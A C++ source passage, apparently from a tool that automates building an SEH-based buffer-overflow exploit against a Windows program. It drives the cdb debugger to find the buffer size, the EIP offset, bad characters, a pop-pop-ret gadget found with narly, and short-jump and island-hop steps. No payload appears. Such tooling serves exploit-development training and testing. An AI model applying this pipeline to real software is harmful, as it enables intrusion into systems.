    std::string msgReturnForSize = cdb.recv_without_break_condition(true);

    std::regex addressRegex("= [a-zA-Z0-9]{8}");
    std::smatch m;
    std::regex_search(msgReturnForSize, m, addressRegex);
    std::string decalage;
    decalage = m[0];
    decalage = decalage.substr(2,8);
    std::cout<<"decalage : "<<decalage<<std::endl;
    
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    return add_esp_command;
}



int main(int argc, char *argv[])
{
    //NE PAS TOUCHER, PERMET DE GENERER AUTOMATIQUEMENT LE FICHIER PROPERTIES.CONF LORS DU PREMIER LANCEMENT.
    if (argc >= 2)
    {
        if (strcmp(argv[1], "setup") == 0)
        {
            SaveParser save;
            save.setup(true);
            return 0;
        }
    }

    int buffer_size = find_buffer_size();
    
    // int buffer_size = 550;

    int taille_offset =  search_value_wich_erase_eip(buffer_size);
    
    // int taille_offset = 128;
    
    std::string esp_address = access_to_esp(buffer_size,taille_offset);
    
    // std::list<std::string> list_bad_char {"00","01","02","09","0a","0c","0d"};
    std::list<std::string> list_bad_char= manage_bad_characters(buffer_size,taille_offset,esp_address);
    
    
    // std::string address_pop_pop_ret="0x1015a2f0"; 
    std::string address_pop_pop_ret = open_and_search_library_with_narly(list_bad_char);
    
    std::string instruction_short_jump = action_on_ret_address(buffer_size,taille_offset,address_pop_pop_ret);
    
    
    std::string add_esp_command = check_stack(buffer_size,taille_offset,address_pop_pop_ret,instruction_short_jump);

    island_hop(buffer_size,taille_offset,address_pop_pop_ret,instruction_short_jump,add_esp_command);

    return 0;
}
